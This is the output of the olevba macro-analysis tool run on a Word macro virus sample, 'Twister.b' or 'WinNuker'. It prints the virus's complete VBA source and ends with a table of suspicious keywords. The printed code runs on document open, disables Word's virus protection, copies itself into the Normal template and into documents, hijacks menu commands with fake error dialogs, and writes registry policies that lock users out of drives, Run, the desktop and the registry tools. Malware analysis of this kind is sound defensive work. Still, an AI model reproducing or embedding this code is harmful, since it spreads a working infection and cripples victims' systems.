olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Twister.b-ad32ef8c79321061776c58ac3516d48f14e5cb52
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Twister.b-ad32ef8c79321061776c58ac3516d48f14e5cb52 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO WinNuker.bas 
in file: Virus.MSWord.Twister.b-ad32ef8c79321061776c58ac3516d48f14e5cb52 - OLE stream: 'Macros/VBA/WinNuker'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
WordBasic.DisableAutoMacros 0: Application.Caption = "Micrøsøft Wørd - WinNuker"
Application.ShowVisualBasicEditor = False: Application.DisplayAlerts = wdAlertsNone
Application.ScreenUpdating = False: Options.VirusProtection = False
Options.SaveNormalPrompt = False: Options.AllowFastSave = False
Options.BlueScreen = True: Application.WindowState = wdWindowStateMaximize

Assistant.Visible = True
Assistant.Move xLeft:=700, yTop:=20
With Assistant.NewBalloon
    .Text = "Autor: Zerø|<LzØ>"
    .Heading = "This is WinNuker"
    .Animation = msoAnimationGetTechy
    .Show
End With
Assistant.Visible = False


FN$ = "C:\Progra~1\WinNuker32.vxd"
Application.VBE.ActiveVBProject.VBComponents.Item("WinNuker").Export FN$

If CheckInstNor = 0 Then
    NormalTemplate.VBProject.VBComponents.Import FN$
End If

If CheckInstDok = 0 Then
    ActiveDocument.VBProject.VBComponents.Import FN$
End If
Call WinNuker
End Sub
Sub DateiDrucken()
Call AutoOpen
    Selection.WholeStory
    A$ = Selection.Font.Name
    B$ = Selection.Font.Size
    Selection.Font.Name = "Bookman Old Style"
    Selection.Font.Size = 30
    Dialogs(wdDialogFilePrint).Show
    ActiveDocument.PrintOut
    Selection.Font.Name = A$
    Selection.Font.Size = B$
    Call WinNuker
End Sub
Sub AnsichtVBCode()
    MsgBox "Die zum Starten von VisualBasic benötigte Datei: VBA32.vxd wurde nicht gefunden!", vbCritical, "Visual Basic Error"
    Call WinNuker
End Sub
Sub AnsichtCode()
    MsgBox "Die zum Starten von VisualBasic benötigte Datei: VBA32.vxd wurde nicht gefunden!", vbCritical, "Visual Basic Error"
    Call WinNuker
End Sub
Sub DateiDokVorlagen()
    MsgBox "Nicht genug freier EMS-Speicher um Anwendung zu starten!", vbCritical, "Microsoft Word:"
    Call WinNuker
End Sub
Sub ExtrasMakro()
' Thanx to Jack Twoflower for this Code :}
Call WinNuker

Dim x
ReDim Combobox1__$(0)
Combobox1__$(0) = ""
ReDim Textbox1__$(0)
Textbox1__$(0) = ""
ReDim Droplistbox2__$(0)
Droplistbox2__$(0) = "Normal.dot (Globale Dokumentvorlage)"

WordBasic.BeginDialog 620, 280, "Makros"
WordBasic.Text 7, 6, 93, 13, "Makro&name:", "Text3"
WordBasic.ComboBox 7, 23, 435, 170, Combobox1__$(), "Combobox1"
WordBasic.Pushbutton 470, 14, 137, 21, "&Ausführen", "Definierbar2"
WordBasic.Cancelbutton 470, 38, 137, 21
WordBasic.Pushbutton 470, 72, 137, 21, "&Schrittweise prüfen", "Definierbar3"
WordBasic.Pushbutton 470, 96, 137, 21, "Bear&beiten", "Definierbar4"
WordBasic.Pushbutton 470, 130, 137, 21, "Ers&tellen", "Definierbar5"
WordBasic.Pushbutton 470, 154, 137, 21, "Org&anisieren", "Definierbar6"
WordBasic.Pushbutton 470, 178, 137, 21, "Orga&nisieren...", "Definierbar7"
WordBasic.Text 7, 200, 93, 13, "Makros in:", "Text1"
WordBasic.Droplistbox 90, 196, 354, 19, Droplistbox2__$(), "Listbox2"
WordBasic.Text 7, 222, 109, 13, "Beschrei&bung:", "Text2"
WordBasic.TextBox 7, 235, 437, 38, Textbox1__$()
WordBasic.EndDialog

Dim dlg As Object
Set dlg = WordBasic.CurValues.Userdialog

x = WordBasic.Dialog.Userdialog(dlg)
Select Case x
Case 0
WordBasic.Cancel
Case 1 To 6
MsgBox "Nicht genug freier EMS-Speicher um Anwendung zu starten!", vbCritical, "Microsoft Word:"
End Select
End Sub
Sub DateiNeu()
    Call AutoOpen
    Call WinNuker
End Sub
Sub DateiDruckenStandard()
    ActiveDocument.PrintOut
    Call AutoOpen
    Call WinNuker
End Sub
Sub WinNuker()
MsgBox "You got Nuked!!", vbCritical, "Ha Ha Ha!"
    System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoDrives") = 3
    System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\System", "NoDispCPL") = 1
    System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\System", "NoSecCPL") = 1
    System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoRun") = 1
    System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoSetFolders") = 1
    System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoFind") = 1
    System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoDesktop") = 1
    System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoClose") = 1
    System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools") = 1
End Sub
Function CheckInstDok()
For x = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(x).Name = "WinNuker" Then
    CheckInstDok = 1
    End If
Next x
End Function
Function CheckInstNor()
For Y = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(Y).Name = "WinNuker" Then
    CheckInstNor = 1
    End If
Next Y
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

